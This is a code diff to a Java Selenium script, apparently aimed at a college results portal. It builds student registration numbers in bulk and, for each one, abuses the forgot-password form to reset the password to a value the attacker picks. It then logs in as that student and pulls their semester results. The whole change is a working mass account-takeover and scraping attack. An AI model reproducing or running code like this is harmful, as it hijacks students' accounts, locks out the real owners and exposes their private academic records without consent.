@@ -11,19 +11,80 @@ import org.openqa.selenium.support.ui.Select;
 import java.time.Duration;
 
 public class MainApp {
-   private static final String TEST_REG_NUMBER = "2020ugec40";
-   private static final String TEST_SEMESTER = "VII";
+    private static final String TEST_REG_NUMBER = "2020ugec065";
+    private static final String TEST_SEMESTER = "VII";
+    private WebDriver driver;
 
     public static void main(String[] args) {
-        //init the Driver
-        WebDriver driver = new ChromeDriver();
+        MainApp app = new MainApp();
 
+        app.initDriver();
+        app.openWebsite();
+        app.extractStudentsResults();
+    }
+
+    private void initDriver() {
+        //init the Driver
+        driver = new ChromeDriver();
+    }
+
+    private void openWebsite() {
         //Open the Website
         driver.get(Constants.BASE_URL);
         WebDriver.Options options = driver.manage();
         options.deleteAllCookies();//delete any cookies website might have stored
         options.window().maximize();//to full screen the window
+    }
 
+    private void extractStudentsResults() {
+        for (String year : Constants.collegeYears) {
+            for (String courseCode : Constants.collegeCourses) {
+                for (String branchCode : Constants.collegeBranchCodes) {
+                    processCombination(year, courseCode, branchCode);
+                }
+            }
+        }
+    }
+
+    private void processCombination(String year, String courseCode, String branchCode) {
+        for (int rollNumber = 1; rollNumber <= Constants.MAX_ROLL_NUMBER_EXPECTED; rollNumber++) {
+            String formattedRollNumber = String.format("%03d", rollNumber);
+            String registrationNumber = generateRegistrationNumber(year, courseCode, branchCode, formattedRollNumber);
+            resetPasswordToOurValue(registrationNumber);
+            loginUser(registrationNumber);
+            showResultsForUser(registrationNumber);
+            extractUserResultToFile(registrationNumber);
+        }
+    }
+
+    private void extractUserResultToFile(String registrationNumber) {
+
+    }
+
+    private void showResultsForUser(String registrationNumber) {
+        //Show Result for given Sem
+        WebElement semesterInputBox = driver.findElement(By.id(Constants.SELECT_SEMESTER_DROPDOWN_BOX_ID));
+        WebElement showResultBtn = driver.findElement(By.id(Constants.SHOW_RESULT_BTN_ID));
+        Select selectSemester = new Select(semesterInputBox);
+        selectSemester.selectByVisibleText(TEST_SEMESTER);
+        showResultBtn.click();
+    }
+
+    private void loginUser(String registrationNumber) {
+        //Now Login to Website
+        WebElement usernameTextInput2 = driver.findElement(By.id(Constants.USERNAME_TEXT_INPUT_ID));
+        WebElement passwordTextInput = driver.findElement(By.id(Constants.PASSWORD_TEXT_INPUT_ID));
+        WebElement submitBtn2 = driver.findElement(By.id(Constants.BTN_SUBMIT_LOGINPAGE_ID));
+        usernameTextInput2.sendKeys(registrationNumber);
+        passwordTextInput.sendKeys(Constants.UNIVERSAL_NEW_PASS_VALUE);
+        submitBtn2.click();
+    }
+
+    private String generateRegistrationNumber(String year, String courseCode, String branchCode, String formattedRollNumber) {
+        return year + courseCode + branchCode + formattedRollNumber;
+    }
+
+    private void resetPasswordToOurValue(String registrationNumber) {
         //Forgot Password
         WebElement forgotPasswordTextLabel = driver.findElement(By.id(Constants.FORGOT_PSWD_TEXT_LABEL_ID));
         forgotPasswordTextLabel.click();//This will navigate to 2nd page (Forgot Password)
@@ -33,7 +94,7 @@ public class MainApp {
         WebElement newPassTextInput = driver.findElement(By.id(Constants.NEW_PASS_TEXT_INPUT_ID));
         WebElement confirmPassTextInput = driver.findElement(By.id(Constants.CONFIRM_PASS_TEXT_INPUT_ID));
         WebElement submitBtn = driver.findElement(By.id(Constants.BTN_SUBMIT_ID));
-        usernameTextInput.sendKeys(TEST_REG_NUMBER);
+        usernameTextInput.sendKeys(registrationNumber);
         newPassTextInput.sendKeys(Constants.UNIVERSAL_NEW_PASS_VALUE);
         confirmPassTextInput.sendKeys(Constants.UNIVERSAL_NEW_PASS_VALUE);
 
@@ -41,27 +102,11 @@ public class MainApp {
         submitBtn.click();
 
         //Wait for alert dialog to come
-        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(3L));
+        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10L));
         Alert alert = driver.switchTo().alert();
         alert.accept();
 
         //Wait for Page to Change
-        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(3L));
-
-        //Now Login to Website
-        WebElement usernameTextInput2 = driver.findElement(By.id(Constants.USERNAME_TEXT_INPUT_ID));
-        WebElement passwordTextInput = driver.findElement(By.id(Constants.PASSWORD_TEXT_INPUT_ID));
-        WebElement submitBtn2 = driver.findElement(By.id(Constants.BTN_SUBMIT_LOGINPAGE_ID));
-        usernameTextInput2.sendKeys(TEST_REG_NUMBER);
-        passwordTextInput.sendKeys(Constants.UNIVERSAL_NEW_PASS_VALUE);
-        submitBtn2.click();
-
-        //Show Result for given Sem
-        WebElement semesterInputBox = driver.findElement(By.id(Constants.SELECT_SEMESTER_DROPDOWN_BOX_ID));
-        WebElement showResultBtn = driver.findElement(By.id(Constants.SHOW_RESULT_BTN_ID));
-        Select selectSemester = new Select(semesterInputBox);
-        selectSemester.selectByVisibleText(TEST_SEMESTER);
-        showResultBtn.click();
-
+        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10L));
     }
 }
